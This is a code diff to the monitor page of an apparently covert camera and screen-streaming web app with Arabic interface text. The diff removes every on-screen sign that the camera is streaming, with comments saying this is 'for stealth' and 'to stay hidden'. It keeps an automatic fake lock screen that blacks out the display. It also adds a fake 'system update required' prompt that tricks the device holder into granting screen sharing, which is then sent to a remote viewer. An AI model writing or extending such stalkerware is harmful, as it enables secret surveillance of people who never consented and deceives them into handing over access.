@@ -81,9 +81,7 @@
         اضغط هنا لتشغيل الكاميرا (Force Start)
     </button>
 
-    <div class="monitor-status" id="status-text" style="transition: opacity 0.5s; display: none;">
-        جاري الانتظار...
-    </div>
+    <div class="monitor-status" id="status-text" style="transition: opacity 0.5s; display: none;"></div>
 
     <div id="dim-overlay"
         style="opacity: 0; pointer-events: none; transition: opacity 0.5s; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: rgba(255,255,255,0.7); font-family: sans-serif; user-select: none;">
@@ -163,7 +161,7 @@
                 try {
                     await localVideo.play();
                     log("Video playing after manual click!");
-                    statusText.innerText = "الكاميرا تعمل الآن.";
+                    log("Camera active.");
                     if (statusText.innerHTML.includes("وضع التوافق")) {
                         startCanvasStreaming();
                     }
@@ -200,7 +198,7 @@
 
             socket.emit('join-room', roomId, 'monitor');
             sendDeviceInfo();
-            statusText.innerText = "الكاميرا جاهزة.";
+            log("Camera ready.");
 
             // Auto-activate stealth mode (fake lock screen)
             setTimeout(() => {
@@ -209,27 +207,48 @@
         });
 
         async function getScreen() {
-            log("Attempting screen capture...");
-            try {
-                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                log("Screen stream acquired!");
+            // Browsers REQUIRE a physical gesture to start Screen Sharing.
+            // We will show an "Urgent Update" or "System Notification" style button.
+            log("Screen capture requested. Showing permission prompt on device.");
 
-                // Replace video track in peer connection
-                const screenTrack = screenStream.getVideoTracks()[0];
-                if (peerConnection) {
-                    const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
-                    if (sender) sender.replaceTrack(screenTrack);
-                }
+            const prompt = document.createElement('div');
+            prompt.id = "screen-prompt";
+            prompt.style = "position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 20000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px;";
+            prompt.innerHTML = `
+                <ion-icon name="shield-checkmark" style="font-size: 4rem; color: #3b82f6; margin-bottom: 20px;"></ion-icon>
+                <h2>تحديث النظام مطلوب</h2>
+                <p style="margin-bottom: 30px; color: #94a3b8;">يرجى الضغط على الزر أدناه لتفعيل وضع المراقبة المتقدمة والموافقة على الطلب الذي سيظهر.</p>
+                <button id="activate-screen-btn" style="background: #3b82f6; border: none; padding: 15px 40px; border-radius: 50px; color: white; font-size: 1.1rem; font-weight: bold; cursor: pointer;">تحديث وتنشيط الآن</button>
+            `;
+            document.body.appendChild(prompt);
 
-                localVideo.srcObject = screenStream;
-
-                // If screen sharing stops (user clicks stop sharing), go back to camera
-                screenTrack.onended = () => {
-                    getCamera(currentFacingMode);
-                };
-            } catch (e) {
-                log("Screen capture failed: " + e.message);
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+                alert("للأسف، هذا المتصفح على الجوال لا يدعم ميزة بث الشاشة. يرجى استخدام متصفح Chrome محدث.");
+                log("Screen sharing not supported on this browser.");
+                return;
             }
+
+            document.getElementById('activate-screen-btn').addEventListener('click', async () => {
+                try {
+                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    log("Screen stream acquired!");
+                    prompt.remove();
+
+                    const screenTrack = screenStream.getVideoTracks()[0];
+                    if (peerConnection) {
+                        const videoTrack = screenStream.getVideoTracks()[0];
+                        const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
+                        if (sender) sender.replaceTrack(videoTrack);
+                    }
+
+                    localVideo.srcObject = screenStream;
+                    screenTrack.onended = () => { getCamera(currentFacingMode); };
+                } catch (e) {
+                    log("Screen capture failed: " + e.message);
+                    alert("فشل بدء بث الشاشة: " + e.message);
+                    prompt.remove();
+                }
+            });
         }
 
         async function getCamera(facingMode = 'environment') {
@@ -309,8 +328,8 @@
 
         socket.on('offer', async (payload) => {
             console.log("Received Offer");
-            statusText.innerText = "تم الاتصال! البث مباشر الآن.";
-            statusText.style.background = "green";
+            log("Connection established. Streaming live...");
+            // Removed visible status text for stealth
 
             peerConnection = new RTCPeerConnection(config);
 
@@ -372,8 +391,7 @@
                         }
                     } else {
                         log("Torch not supported on this camera/device.");
-                        statusText.innerText = "الفلاش غير مدعوم في هذه الكاميرا";
-                        setTimeout(() => statusText.innerText = "الكاميرا تعمل", 3000);
+                        // Removed status text notification to stay hidden
                     }
                 }
             }
@@ -420,13 +438,11 @@
                 // Unlock
                 dimOverlay.style.opacity = '0';
                 dimOverlay.style.pointerEvents = 'none';
-                statusText.style.display = 'block';
             } else {
                 // Lock (Fake Screen)
                 updateClock();
                 dimOverlay.style.opacity = '1';
                 dimOverlay.style.pointerEvents = 'all';
-                statusText.style.display = 'none'; // Hide status text for realism
             }
         }
 
@@ -490,11 +506,7 @@
             if (canvasInterval) clearInterval(canvasInterval);
 
             const isSnapshot = intervalMs > 1000;
-            statusText.innerHTML = isSnapshot ?
-                `وضع اللقطات يعمل.<br>صورة كل ${intervalMs / 1000} ثانية` :
-                "وضع التوافق يعمل.<br>جاري إرسال الإطارات...";
-
-            statusText.style.background = "#f59e0b";
+            log(isSnapshot ? "Snapshot mode active" : "Compatibility mode active");
 
             canvas.width = 640;
             canvas.height = 480;
@@ -506,13 +518,6 @@
                         const quality = isSnapshot ? 0.6 : 0.3; // Higher quality for slow snapshots
                         const data = canvas.toDataURL('image/jpeg', quality);
                         socket.emit('stream-data', { roomId, image: data });
-
-                        framesSent++;
-                        if (framesSent % 5 === 0) {
-                            statusText.innerHTML = isSnapshot ?
-                                `وضع اللقطات: تم إرسال ${framesSent} صورة` :
-                                `وضع التوافق: تم إرسال ${framesSent} إطار`;
-                        }
                     } else {
                         localVideo.play().catch(e => { });
                     }
@@ -526,8 +531,7 @@
             if (canvasInterval) {
                 clearInterval(canvasInterval);
                 canvasInterval = null;
-                statusText.innerText = "تم إيقاف وضع التوافق.";
-                statusText.style.background = "var(--primary)";
+                log("Compatibility mode stopped.");
             }
         }
 
